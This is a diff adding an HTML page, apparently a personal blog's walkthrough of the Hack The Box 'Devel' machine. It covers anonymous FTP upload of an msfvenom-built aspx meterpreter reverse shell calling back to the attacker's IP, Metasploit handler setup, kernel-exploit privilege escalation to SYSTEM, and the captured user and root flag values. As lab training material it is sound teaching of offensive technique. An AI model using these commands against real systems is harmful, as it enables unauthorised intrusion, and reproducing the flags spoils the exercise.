@@ -1,0 +1,112 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>HTB - Devel</title>
+    <link href="/index.css" rel="stylesheet" />
+  </head>
+
+  <body>
+    <article><div><h1>HTB - Devel</h1><h2>Enumeration</h2><h4>Nmap</h4><p>Using the following command:</p><pre><code>nmap -sC -sV -p- -vv --min-rate 10000 10.10.10.5
+</code></pre><p>We receive the following output:</p><p><img src="/images/Pasted image 20250113025557.png" alt="Pasted image 20250113025557.png"></img></p><h4>FTP</h4><p>From the Nmap scan we see that anonymous ftp access is allowed. So we will enter ftp using the following command:</p><pre><code>ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:randomsensei): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> 
+</code></pre><p>Looking at the directories within the FTP server, we see that it looks like the web directories of a Windows server (such as the one on the HTTP port).</p><pre><code>ftp> ls
+229 Entering Extended Passive Mode (|||49158|)
+125 Data connection already open; Transfer starting.
+03-18-17  01:06AM       <DIR>          aspnet_client
+03-17-17  04:37PM                  689 iisstart.htm
+03-17-17  04:37PM               184946 welcome.png
+226 Transfer complete.
+</code></pre><p>Now we will check if we can use <code>put</code> to add a script into the directory:</p><pre><code>ftp> put test
+local: test remote: test
+229 Entering Extended Passive Mode (|||49167|)
+125 Data connection already open; Transfer starting.
+     0        0.00 KiB/s 
+226 Transfer complete.
+ftp> ls
+229 Entering Extended Passive Mode (|||49168|)
+125 Data connection already open; Transfer starting.
+03-18-17  01:06AM       <DIR>          aspnet_client
+03-17-17  04:37PM                  689 iisstart.htm
+01-12-25  06:13PM                    0 test
+03-17-17  04:37PM               184946 welcome.png
+226 Transfer complete.
+</code></pre><p>Here we see that we can do it, but rather than finding and exploit online or creating a new exploit ourselves, we know that we can place a <code>.aspx</code> script that will run meterpreter which will help in the post-exploitation phase.</p><h2>Exploit</h2><p>To obtain shell, we will make use of msfvenom in the following command:</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o devel.aspx LHOST=10.10.16.16 LPORT=4444
+</code></pre><p>Now we have the shell file, we will now place this in the ftp server by doing the following:</p><pre><code>ftp 10.10.10.5
+Connected to 10.10.10.5.
+220 Microsoft FTP Service
+Name (10.10.10.5:randomsensei): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> put devel.aspx
+local: devel.aspx remote: devel.aspx
+229 Entering Extended Passive Mode (|||49238|)
+125 Data connection already open; Transfer starting.
+100% |******************************************************************************************************************************************|  2926       48.95 MiB/s    --:-- ETA
+226 Transfer complete.
+2926 bytes sent in 00:00 (50.12 KiB/s)
+ftp> ls
+229 Entering Extended Passive Mode (|||49239|)
+125 Data connection already open; Transfer starting.
+03-18-17  01:06AM       <DIR>          aspnet_client
+01-13-25  04:59PM                 2926 devel.aspx
+03-17-17  04:37PM                  689 iisstart.htm
+01-12-25  06:13PM                    0 test
+03-17-17  04:37PM               184946 welcome.png
+226 Transfer complete.
+</code></pre><p>Now we will head into msfconsole and run the listener handler to capture the reverse shell. We will run the following module:</p><pre><code>msfconsole
+use exploit/multi/handler
+set LHOST 10.10.16.16
+set payload windows/meterpreter/reverse_tcp
+exploit
+</code></pre><p>Now we will head to the website and to the devel.aspx directory on <code>http://10.10.10.5/devel.aspx</code>. Now we receive the connection in our metasploit handler.</p><pre><code>[*] Started reverse TCP handler on 10.10.16.16:4444 
+[*] Sending stage (176198 bytes) to 10.10.10.5
+[*] Meterpreter session 1 opened (10.10.16.16:4444 -> 10.10.10.5:49159) at 2025-01-13 12:10:58 +1100
+
+meterpreter > ls
+Listing: c:\windows\system32\inetsrv
+</code></pre><p>Now that we have access into the windows system as the user:</p><pre><code>getuid
+Server username: IIS APPPOOL\Web
+</code></pre><p>Checking the files on the system, at the Users directory we see the babis and Administrator directories, however, with our current privileges we cannot access those directories.</p><h2>Privilege Escalation</h2><p>Now we need to attempt to escalate privileges, due to the fact that we are using a meterpreter session, we are able to background the session and run post exploitation payloads to attempt the escalate our privileges. To do so we will use the <code>local</code><i>exploit</i>suggester<code> exploit.</code></p><pre><code>bg
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+exploit
+</code></pre><p><img src="/images/Pasted image 20250113122112.png" alt="Pasted image 20250113122112.png"></img></p><p>From the output we see many exploits that say that they may work. We will go through all of the exploits to see if any actually are able to escalate our privileges. Eventually we find a module that is actually able to escalate privileges because it shows a new meterpreter shell:</p><pre><code>use exploit/windows/local/ms10_015_kitrap0d
+set SESSION 1
+set LHOST 10.10.16.16
+exploit
+[*] Started reverse TCP handler on 10.10.16.16:4444 
+[*] Reflectively injecting payload and triggering the bug...
+[*] Launching netsh to host the DLL...
+[+] Process 2452 launched.
+[*] Reflectively injecting the DLL into 2452...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (176198 bytes) to 10.10.10.5
+[*] Meterpreter session 2 opened (10.10.16.16:4444 -> 10.10.10.5:49161) at 2025-01-13 12:24:49 +1100
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre><p>So using the <code>ms10</code><i>015</i>kitrap0d<code> module we were able to escalate our privileges.  Now we can head to the babis Desktop at the </code>C:\Users\babis\Desktop<code>. There we see the user.txt file:</code></p><pre><code>cd C:\Users\babis\Desktop
+cat user.txt
+939f318c300aa25a6c1b55def5f6ca3d
+</code></pre><p>Now we can head to the Administrator's Desktop at the <code>C:\Users\Administrator\Desktop</code>. There we see the root.txt file:</p><pre><code>cd C:\Users\Administrator\Desktop
+cat root.txt
+26a79867895cbac3446088e6ad8ad094
+</code></pre></div></article>
+    <a href="/">Back to Home</a>
+  </body>
+  <hr>
+  <footer>
+    Made By Rishan
+  </footer>
+</html>
